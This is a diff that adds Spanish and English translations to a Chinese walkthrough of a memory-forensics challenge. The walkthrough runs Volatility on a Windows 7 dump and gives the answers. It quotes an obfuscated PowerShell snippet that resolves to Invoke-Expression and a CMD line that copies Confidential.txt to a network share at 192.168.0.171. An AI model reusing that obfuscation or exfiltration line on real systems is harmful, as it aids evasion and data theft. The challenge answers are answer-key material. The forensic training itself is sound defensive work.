@@ -14,20 +14,27 @@
 
 A junior member of our security team has been performing research and testing on what we believe to be an old and insecure operating system. We believe it may have been compromised & have managed to retrieve a memory dump of the asset. We want to confirm what actions were carried out by the attacker and if any other assets in our environment might be affected. Please answer the questions below.
 
-我们安全团队的一名初级成员一直在对我们认为是旧且不安全的操作系统进行研究和测试。我们相信它可能已经遭到入侵，并且我们已经成功获取了该资产的内存转储。我们希望确认攻击者采取了哪些行动，以及我们环境中是否还有其他资产受到影响。请回答以下问题。
+> [ZH] "我们安全团队的一名初级成员一直在对我们认为是旧且不安全的操作系统进行研究和测试。我们相信它可能已经遭到入侵，并且我们已经成功获取了该资产的内存转储。我们希望确认攻击者采取了哪些行动，以及我们环境中是否还有其他资产受到影响。请回答以下问题。"
+> **ES:** Un junior investigaba un SO viejo e inseguro que podría estar comprometido: hay un volcado de memoria y hay que reconstruir las acciones del atacante y el alcance.
+> **EN:** A junior was testing an old, insecure OS that may be compromised: a memory dump is available to reconstruct attacker actions and scope.
+
 :::
 
-## 题目数据
+## 题目数据 / Datos / Data
 
 :::note
 
-由于附件过大，故在此不提供下载链接
+> [ZH] "由于附件过大，故在此不提供下载链接"
+> **ES:** Anexo demasiado grande: sin enlace de descarga aquí.
+> **EN:** Attachment too large: no download link here.
 
 :::
 
-## Task 1
+## Task 1 — Sistema operativo / Operating system
 
-> 机器的操作系统是什么？
+> [ZH] "机器的操作系统是什么？"
+> **ES:** ¿Cuál es el sistema operativo de la máquina?
+> **EN:** What is the machine's operating system?
 
 Volatility2
 
@@ -84,19 +91,25 @@ PE TimeDateStamp        Thu Aug  2 02:18:10 2018
 Windows 7
 ```
 
-## Task 2
+## Task 2 — Fecha del volcado / Dump creation time
 
-> 内存转储是什么时候创建的？
+> [ZH] "内存转储是什么时候创建的？"
+> **ES:** ¿Cuándo se creó el volcado de memoria?
+> **EN:** When was the memory dump created?
 
-上文中就有
+> [ZH] "上文中就有"
+> **ES:** El dato ya aparece en la salida anterior (`imageinfo`).
+> **EN:** The value already appears in the previous (`imageinfo`) output.
 
 ```plaintext title="Answer"
 2022-12-19 16:07:30
 ```
 
-## Task 3
+## Task 3 — Comando ofuscado en portapapeles / Obfuscated clipboard command
 
-> 在攻击者获得对机器的访问权限后，攻击者将一个混淆的 PowerShell 命令复制到了剪贴板上。这个命令是什么？
+> [ZH] "在攻击者获得对机器的访问权限后，攻击者将一个混淆的 PowerShell 命令复制到了剪贴板上。这个命令是什么？"
+> **ES:** Tras obtener acceso, el atacante copió un comando PowerShell ofuscado al portapapeles: ¿cuál era?
+> **EN:** After gaining access, the attacker copied an obfuscated PowerShell command to the clipboard: what was it?
 
 ```bash title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 clipboard"
 Volatility Foundation Volatility Framework 2.6.1
@@ -112,9 +125,11 @@ Session    WindowStation Format                         Handle Object           
 (gv '*MDR*').naMe[3,11,2]-joIN''
 ```
 
-## Task 4
+## Task 4 — Alias del comando ofuscado / Obfuscated alias name
 
-> 攻击者复制了混淆命令，将其用作 PowerShell 命令的别名。这个命令的名称是什么？
+> [ZH] "攻击者复制了混淆命令，将其用作 PowerShell 命令的别名。这个命令的名称是什么？"
+> **ES:** El atacante usó el comando ofuscado como alias de un cmdlet PowerShell: ¿qué nombre resuelve?
+> **EN:** The attacker used the obfuscated snippet as an alias of a PowerShell cmdlet: which name does it resolve to?
 
 ```bash title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 consoles"
 Volatility Foundation Volatility Framework 2.6.1
@@ -275,7 +290,9 @@ iex
 PS C:\Users\user>
 ```
 
-在其中关注到
+> [ZH] "在其中关注到"
+> **ES:** En el historial de consola, fijarse en esta resolución:
+> **EN:** In the console history, note this resolution:
 
 ```bash
 PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN''
@@ -286,11 +303,15 @@ iex
 Invoke-Expression
 ```
 
-## Task 5
+## Task 5 — Línea de exfiltración CMD / CMD exfil command line
 
-> 执行了一个 CMD 命令，试图将一个文件渗透出去。完整的命令行是什么？
+> [ZH] "执行了一个 CMD 命令，试图将一个文件渗透出去。完整的命令行是什么？"
+> **ES:** Se ejecutó un comando CMD para exfiltrar un archivo: ¿cuál fue la línea completa?
+> **EN:** A CMD command tried to exfiltrate a file: what was the full command line?
 
-在上一题中可以得到
+> [ZH] "在上一题中可以得到"
+> **ES:** El comando ya aparece en el historial de la tarea anterior.
+> **EN:** The command already appears in the previous task's history.
 
 ```plaintext title="Answer"
 type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
